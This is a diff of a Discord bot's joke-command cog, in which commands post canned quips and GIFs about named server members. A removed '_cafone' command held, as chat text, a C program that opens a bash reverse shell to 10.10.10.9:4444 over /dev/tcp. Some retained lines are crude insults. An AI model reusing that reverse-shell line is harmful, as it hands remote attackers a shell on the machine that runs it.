@@ -32,23 +32,20 @@ class Prestige(commands.Cog, command_attrs=dict(hidden=True)):
     async def _gabriel_slash(self, ctx) -> None:
         """ Tells you something about Gabriel. """
 
-        await ctx.respond(f"**<@366628959657394186>? Il est frais et il est chaud, et quand il rap c'est que du feu**")
+        await ctx.respond(f"**<@875915997767430214>? Il est frais et il est chaud, et quand il rap c'est que du feu**")
 
     @commands.command(name="gabriel", aliases=["gab", "gabi", "gbrl", "gaburierudesu", "camisa9", "atacante", "rapper"])
     async def _gabriel_command(self, ctx) -> None:
         """ Tells you something about Gabriel. """
 
-        await ctx.send(f"**<@366628959657394186>, desculpa por interromper o seu andamento, é que eu te vi passando, você é artista?**")
-
-    @slash_command(name="twiks", guild_ids=guild_ids)
-    async def _twiks(self, ctx) -> None:
-        """ Tells you something about Twiks. """
-
-        await ctx.respond(f"**Twiks est mon frérot !**")
-
+        await ctx.message.delete()
+        await ctx.send(f"**<@875915997767430214>, desculpa por interromper o seu andamento, é que eu te vi passando, você é artista?**")
+        
     @commands.command(aliases=["lexi", "lèqçi", "lexis"])
     async def alexis(self, ctx) -> None:
         """ A command for telling something about Alexis. """
+
+        await ctx.message.delete()
 
         sentences = [
             "**I have a really nice voice**",
@@ -60,22 +57,19 @@ class Prestige(commands.Cog, command_attrs=dict(hidden=True)):
 
         await ctx.send(choice(sentences))
 
-    @commands.command(aliases=["eli", "elj", "elijaaah"])
-    async def elijah(self, ctx) -> None:
-        """ A command for telling something about Elijah. """
-
-        await ctx.send("**Sure, go for it.**")
-
     @commands.command()
     async def freak(self, ctx) -> None:
         """ A command for telling something about Marceline. """
 
+        await ctx.message.delete()
         await ctx.send("You mean missy aka Marceline")
 
     @commands.command()
     async def hiba(self, ctx) -> None:
         """ A command for telling something about Hiba. """
 
+        await ctx.message.delete()
+        
         sentences = [
             "<@760178072904531988> Give me attention",
             "<@760178072904531988>\nAll of these girl on some uppercase shi\nThat means they all cap\nBeing the best at whatever i do\nThat’s sounding on brand",
@@ -91,21 +85,11 @@ class Prestige(commands.Cog, command_attrs=dict(hidden=True)):
 
         await ctx.send(choice(sentences))
 
-    @commands.command(aliases=["winni", "winnie", "wynni", "wynnie"])
-    async def wyncham(self, ctx) -> None:
-        """ A command for telling something about Wyncham. """
-
-        sentences = [
-            "**You have a really nice voice**",
-            "**Leonarda is my best friend**",
-            "**Elijah and DNK are my brothers**"
-        ]
-
-        await ctx.send(choice(sentences))
-
     @commands.command(aliases=["not_lime", "lemonade", "citric", "yellow_fruit"])
     async def lemon(self, ctx) -> None:
-        """ A command for telling something about Wyncham. """
+        """ A command for telling something about Lemon. """
+
+        await ctx.message.delete()
 
         sentences = [
             "**Easy peasy, lemon squeezy** �",
@@ -115,63 +99,11 @@ class Prestige(commands.Cog, command_attrs=dict(hidden=True)):
 
         await ctx.send(choice(sentences))
 
-    @commands.command(aliases=["frenzy"])
-    async def frenesia(self, ctx) -> None:
-        """ A command for telling something about frenesia. """
-
-        sentences = [
-            "# MIAOOOOOOO <:cat_wave:924495909595779082> <@439110609745870870>",
-            "**CIAO SONO FRENESIA 🇮🇹 <@439110609745870870>**",
-            "AHAHAAHAHAHA <@439110609745870870>"
-        ]
-
-        await ctx.send(choice(sentences))
-
-    @commands.command(aliases=["cafone", "napoletano", "forzanapoli", "ihatepython", "cbestlanguage", "iloveassembly", "iloveasm"])
-    async def _cafone(self, ctx) -> None:
-        """ A command for telling something about cafone. """
-
-        sentences = [
-            "i heard **assembly** <:peep_selfie:959872040301629561> <@703017795738402827>",
-            "i heard **c++** <:peep_selfie:959872040301629561> <@703017795738402827>",
-            "i heard **c** <:peep_selfie:959872040301629561> <@703017795738402827>",
-            "i heard *python* <:pepecool:572067081508618251> <@703017795738402827>",
-            """<@703017795738402827>
-```c
-#include <stdio.h>
-#include <stdlib.h>
-
-int main(void)
-{
-  const char* command = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.9/4444 0>&1'";
-  const char* message = "cafone best engineer and hacker\\n";
-  int result;
-
-  result = system(command);
-  if(result == -1)
-  {
-    printf("Error when executing the command.\\n");
-    return 1;
-  }
-  else
-  {
-    printf("yeaahhh boiiii\\n");
-  }
-
-  for(;;)
-    printf(message);
-
-  return 0;
-}
-```""",
-            "**sexiest italo/spanish engineer & hacker on the server🇮🇹🇪🇦** <@703017795738402827>"
-        ]
-
-        await ctx.send(choice(sentences))
-
     @commands.command(aliases=["felipe"])
     async def sousa(self, ctx) -> None:
         """ A command for telling something about Sousa. """
+
+        await ctx.message.delete()
 
         sentences = [
             "If you give <@372100977060347906> a cup of coffee, he might tell you a secret...",
@@ -183,6 +115,9 @@ int main(void)
 
     @commands.command(aliases=["maksiu", "maks1u", "c4tchme"])
     async def choose_right(self, ctx) -> None:
+        """ A command for telling something about maksiu. """
+
+        await ctx.message.delete()
 
         idkWhichOne = [
             "Oh, <@312940056115544064>. 🧠 He's found... never mind",
@@ -198,6 +133,8 @@ int main(void)
     async def keybirds(self, ctx) -> None:
         """ A command for telling something about Keybirds. """
 
+        await ctx.message.delete()
+
         sentences = [
             "<@584699027421921280> Well, sounds like a good idea",
             "<@584699027421921280> Stina wants to go outside",
@@ -210,37 +147,102 @@ int main(void)
     async def loral(self, ctx) -> None:
         """ A command for telling something about Loral. """
 
+        await ctx.message.delete()
         await ctx.send("<@759049454819999776> Mans annoying")
 
     @commands.command()
     async def leonor(self, ctx) -> None:
         """ A command for telling something about Leonor. """
 
+        await ctx.message.delete()
         await ctx.send("<@754678627265675325> Human brain smells like cat piss when it dries out")
 
     @commands.command()
     async def anis(self, ctx) -> None:
         """ A command for telling something about anis. """
 
+        await ctx.message.delete()
         await ctx.send("<@515991382217981952> niso")
 
-    @commands.command(aliases=["hodjapie", "onekebappls"])
+    @commands.command(aliases=["hodjapie", "kebap", "kebapguy", "onekebappls"])
     async def hodja(self, ctx) -> None:
         """ A command for telling something about the kebap guy, Hodja. """
 
+        await ctx.message.delete()
+
         sentences = [
             "**I THOUGHT YOU WERE A GIRL** <@201086628167417857>",
-            "*One kebap, please!* <@201086628167417857>"
+            "*one kebap pls* <@201086628167417857>",
+            "**the f-ck is up yo?** <@201086628167417857>",
+            "*aferin* <@201086628167417857>",
+            "**muazzam** <@201086628167417857>",
+            "*type shi* <@201086628167417857>",
+            "*burada demokrasi yok hocam* <@201086628167417857>",
+            "**allahümmeyarab** <@201086628167417857>",
+            "*haydaaa* <@201086628167417857>",
+            "*şeytan müzik listener* <@201086628167417857>"
         ]
 
-        if randrange(67) == 33:
-            await ctx.send("**SUPER RARE DOUBLE LAVASH KEBAP PULL!!!** <@201086628167417857>")
+        gifs = [
+            "https://tenor.com/view/gopher-groundhod-groundhog-eating-gopher-eating-gopher-eating-carrot-gif-26389545",
+            "https://tenor.com/view/cerbervt-cerber-vtuber-gif-543256581190828359",
+            "https://tenor.com/view/meme-down-syndrome-funny-tongue-action-tongue-out-meme-gif-572114404054760484",
+            "https://tenor.com/view/ma%C3%A7avras1-gif-16101498646883457546",
+            "https://tenor.com/view/peaky-blinders-no-fighting-no-fucking-fighting-fight-fuck-gif-16259749058826278291",
+            "https://tenor.com/view/open-season-boog-elliot-sicko-mode-booty-shake-gif-15909219",
+            "https://tenor.com/view/cat-one-at-a-time-ladies-aaron-if-he-was-a-cat-funny-cat-gif-565648516443483223",
+            "https://tenor.com/view/qurial-bleeeh-cat-meme-qvrial-gif-27229139",
+            "https://tenor.com/view/ankara-bina-%C3%A7%C3%B6l-ankara-%C3%A7%C3%B6l-ankara-kalp-gif-3276235952120258144",
+            "https://tenor.com/view/orange-cat-gets-flung-and-explodes-orange-cat-funny-cat-meme-explodes-gif-10706110874965244466",
+            "https://tenor.com/view/mean-cat-cat-fu-gif-23644413",
+            "https://tenor.com/view/homer-the-simpsons-dance-wiggle-gif-17689048",
+            "https://media.discordapp.net/attachments/780931454845583410/846535086933147689/13f.gif",
+            "https://tenor.com/view/lowtiergod-low-tier-god-ltg-dale-girlboss-gif-15880573990312780020",
+            "https://tenor.com/view/low-tier-god-awesome-mario-twerking-gif-23644561",
+            "https://tenor.com/view/recep-ivedik-gif-17979851115064014078",
+            "https://tenor.com/view/u%C4%9Fur-d%C3%BCndar-gif-21913397",
+            "https://tenor.com/view/k%C4%B1l%C4%B1%C3%A7daro%C4%9Flu-gif-17522471039651255534",
+            "https://tenor.com/view/recep-ivedik-gif-20643754",
+            "https://tenor.com/view/bruh-gif-23441586",
+            "https://tenor.com/view/cute-anime-anime-girl-pink-hearts-gif-2859182496452245481",
+            "https://tenor.com/view/funny-emo-wolf-werewolf-transform-gif-27196401",
+            "https://tenor.com/view/%C3%A7okzorya-cokzorua-cokzorya-%C3%A7ok-zor-ya-%C3%A7ok-zor-ya-diyen-adam-gif-10957057876352588846",
+            "https://tenor.com/view/fbi-kana-gif-7441334008951759059",
+            "https://tenor.com/view/ali-ko%C3%A7-gif-18426190093325981609",
+            "https://tenor.com/view/shrek-smirk-gif-10170997843933469713",
+            "https://tenor.com/view/discord-ban-appeal-gif-3829887507116417894",
+            "https://tenor.com/view/homer-simpson-simpsons-kebab-gif-9043334",
+            "https://tenor.com/view/kebap%C3%A7%C4%B1-abi-terleyen-kebap%C3%A7%C4%B1-abi-kebap-yapan-abi-terleyen-abi-terleyen-adam-gif-16683983459963325554",
+            "https://tenor.com/view/khontkar-zenci-ensar-nas%C4%B1l-olunuyor-peki-rk-dance-gif-13595955285171961629",
+            "https://media.discordapp.net/attachments/1107006693503684638/1202297577589194805/bruhgif.gif",
+            "https://tenor.com/view/lowtiergod-ltg-excuse-me-what-huh-gif-16649578861553422481",
+            "https://tenor.com/view/roblox-roblox-run-low-quality-gif-7119753476526813171",
+            "https://tenor.com/view/rterahatsiz-gif-7057240225373514376",
+            "https://tenor.com/view/monkey-shocked-monkey-disappointed-disappointed-monkey-gif-25631537",
+            "https://tenor.com/view/transitions-kinemaster-black-guy-suit-tiktok-gif-25279479",
+            "https://tenor.com/view/suit-black-man-sitting-posing-gif-27703959",
+            "https://tenor.com/view/side-eye-dog-gif-22972113",
+            "https://tenor.com/view/abdulhamit-abdul-kalam-abdulh-abdulham-abdulhami-gif-26119085",
+            "https://tenor.com/view/pepe-the-frog-cave-get-inside-walk-in-gif-16937105",
+            "https://tenor.com/view/praise-allah-gif-24350702",
+            "https://tenor.com/view/bruh-bruh-triggered-bruh-bttv-meme-gif-16887494"
+        ]
+
+        chance = randrange(67)
+        if chance in [3, 6, 11, 13, 16, 22, 23, 26, 36, 43, 46, 44, 53, 55, 56, 63, 66]: # don't even ask 
+            await ctx.send("<@201086628167417857>", delete_after=11)
+            await ctx.send(choice(gifs), delete_after=11)
+        elif chance == 33:
+            await ctx.send("**SUPER RARE DOUBLE LAVASH KEBAP PULL!!!** <@201086628167417857>", delete_after=11)
+            await ctx.send("https://tenor.com/view/ayran-gif-10772760", delete_after=11)
         else:
-            await ctx.send(choice(sentences))
+            await ctx.send(choice(sentences), delete_after=11)
             
     @commands.command(aliases=["jelly", "jellyfish", "jellytimet", "jogurt", "doctor"])
     async def _jelly(self, ctx) -> None:
         """ A command for telling something about Jelly. """
+
+        await ctx.message.delete()
 
         sentences = [
             "love you all from <@781007535267119138>",
